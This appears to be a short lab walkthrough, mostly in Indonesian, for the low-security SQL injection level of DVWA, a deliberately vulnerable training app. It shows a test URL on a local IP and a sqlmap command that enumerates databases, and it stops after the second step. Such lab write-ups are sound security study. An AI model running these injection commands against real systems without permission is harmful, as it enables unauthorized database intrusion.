<b> HOW TO SOLVE SQL INJECTION LOW </b>

1. First, kita masukin user ID dengan angka '1' untuk men test, setelah itu kita copy url nya

``
http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit# 
``

![Screenshot (445)](https://user-images.githubusercontent.com/118157585/215420792-fea06c63-43ad-459a-bca5-b848f089d75d.png)

2. Lalu kita buka Sqlmap di cli kita, copy url tadi. berikut perintahnya :

``
sqlmap -u 'http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#' --dbs
``
